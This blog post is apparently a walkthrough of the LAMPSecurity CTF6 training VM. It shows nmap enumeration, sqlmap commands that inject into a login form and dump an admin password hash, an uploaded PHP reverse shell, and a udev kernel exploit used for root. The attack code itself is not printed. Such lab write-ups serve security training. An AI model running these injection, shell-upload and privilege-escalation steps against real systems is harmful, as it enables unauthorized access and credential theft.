---
layout: blog_item
title:  "LAMP Security CTF6 - Walkthrough"
date:   2014-03-04 19:40:60
author: Arr0way
description: 'LAMP Security CTF 6 - Walkthrough Guide'
categories: [walkthroughs]
tags:
- CTF
---


<div class="coffee-rating">
<table>
      <tbody>
        <tr>
           <td>
               <p><code>Coffee Difficulty Rating:</code></p>
           </td>
           <td>
               <p><i class="fa fa-coffee"></i></p>
           </td>
        </tr>
      </tbody>
</table>
</div>

* list element with functor item
{:toc}

## Author Description

The LAMPSecurity project is an effort to produce training and benchmarking
tools that can be used to educate information security professionals and test
products.

**Author:** madirish2600

**Download:** [VulnHub](https://www.vulnhub.com)

<div class="note info">
  <h5>Dislcaimer: Multiple Entry Points</h5>
  <p>The LAMPSecurity series is not particularly challenging, for each VM in the series I've targeted the <b>web application</b> as the entry point.</p>
</div>

## Enumeration

### Host Service Enumeration

{% highlight bash %}

nmap -v -p 1-65535 -sV -O -sT 192.168.30.131

{% endhighlight %}

<div class="mobile-side-scroller">
<table>
  <thead>
    <tr>
      <th>Port</th>
      <th>Service</th>
      <th>Version Detection</th>
    </tr>
  </thead>
      <tbody>
        <tr>
           <td>
               <pc><p><code>TCP: 22</code></p></pc>
           </td>
           <td>
               <pc><p>SSH</p></pc>
           </td>
           <td>
               <pc><p>OpenSSH 4.3 (protocol 2.0)</p></pc>
           </td>
        </tr>
        <tr>
           <td>
               <pc><p><code>TCP: 80</code></p></pc>
           </td>
           <td>
              <pc><p>HTTP</p></pc>
           </td>
           <td>
               <pc><p>Apache httpd 2.2.3 ((CentOS))</p></pc>
           </td>
        </tr>

        <tr>
           <td>
               <pc><p><code>TCP: 110</code></p></pc>
           </td>
           <td>
              <pc><p>pop3</p></pc>
           </td>
           <td>
               <pc><p>Dovecot pop3d</p></pc>
           </td>
        </tr>

        <tr>
           <td>
               <pc><p><code>TCP: 111</code></p></pc>
           </td>
           <td>
              <pc><p>rpcbind</p></pc>
           </td>
           <td>
               <pc><p>N/A</p></pc>
           </td>
        </tr>
        <tr>
          <td>
               <pc><p><code>TCP: 143</code></p></pc>
           </td>
           <td>
              <pc><p>IMAP</p></pc>
           </td>
           <td>
               <pc><p>Dovecot imapd</p></pc>
           </td>
        </tr>

        <tr>
           <td>
               <pc><p><code>TCP: 443</code></p></pc>
           </td>
           <td>
              <pc><p>HTTPS</p></pc>
           </td>
           <td>
               <pc><p>Apache httpd 2.2.3 ((CentOS))</p></pc>
           </td>
        </tr>

        <tr>
           <td>
               <pc><p><code>TCP: 621</code></p></pc>
           </td>
           <td>
              <pc><p>RPC</p></pc>
           </td>
           <td>
               <pc><p>N/A</p></pc>
           </td>
        </tr>
        <tr>
           <td>
               <pc><p><code>TCP: 993</code></p></pc>
           </td>
           <td>
              <pc><p>IMAP SSL</p></pc>
           </td>
           <td>
               <pc><p>Dovecot imapd</p></pc>
           </td>
        </tr>

        <tr>
           <td>
               <pc><p><code>TCP: 995</code></p></pc>
           </td>
           <td>
              <pc><p>POP3 SSL</p></pc>
           </td>
           <td>
               <pc><p>Dovecot pop3d</p></pc>
           </td>
        </tr>

        <tr>
           <td>
               <pc><p><code>TCP:3306 </code></p></pc>
           </td>
           <td>
              <pc><p>MySQL</p></pc>
           </td>
           <td>
               <pc><p>MySQL 5.0.45</p></pc>
           </td>
        </tr>

      </tbody>

</table>
</div>

## Web Application Enumeration

Inspection of the Web Application indicated it was vulnerable to SQL injection.



## SQLMap - SQL Injection

SQLMap confirmed [SQL injection](/penetration-testing/web-app/sql-injection/)) was possible.

{% highlight bash %}
[ root:~]# sqlmap -o -u "http://192.168.221.131/?action=login" --forms --dbs

available databases [5]:
[*] cms
[*] information_schema
[*] mysql
[*] roundcube
[*] test
{% endhighlight %}

SQLMap form enumeration:

{% highlight bash %}
[root:~]# sqlmap -o -u "http://192.168.221.131/?action=login" --forms  -D cms
--tables

Database: cms
[3 tables]
+-------+
| user  |
| event |
| log   |
+-------+
{% endhighlight %}

SQLMap database dump + admin account hash cracked:

{% highlight bash %}
[root:~]# sqlmap -o -u "http://192.168.221.131/?action=login" --forms  -D cms
-T user --dump

Database: cms
Table: user
[1 entry]
+---------+---------------+----------------------------------------------+
| user_id | user_username | user_password                                |
+---------+---------------+----------------------------------------------+
| 1       | admin         | 25e4ee4e9229397b6b17776bfceaf8e7 (adminpass) |
+---------+---------------+----------------------------------------------+
{% endhighlight %}

## Web Application Exploitation

Using the previously discovered admin account credentials, it was possible to login to the web application and upload a php reverse shell using an image upload form.

![PHP Web Shell Upload](/img/blog/ctf6/webshell.png)

## Local Privilege Escalation

A successful reverse shell was establish and the kernel appeared to be
vulnerable to a well know [Linux 2.6 kernel udev
exploit](https://www.exploit-db.com/exploits/8478/).

{% highlight bash %}
sh-3.2$ uname -ar
Linux localhost.localdomain 2.6.18-92.el5 #1 SMP Tue Jun 10 18:49:47 EDT 2008
i686 i686 i386 GNU/Linux
{% endhighlight %}

The exploit requires the PID for the udev process, the exploit does not work
flawlessly as you can see below it may take several attempts to get a root
shell.

![Exploit Process UDEV PID](/img/blog/ctf6/exploit-process-udev-pid.png)

Thanks for the VM :)
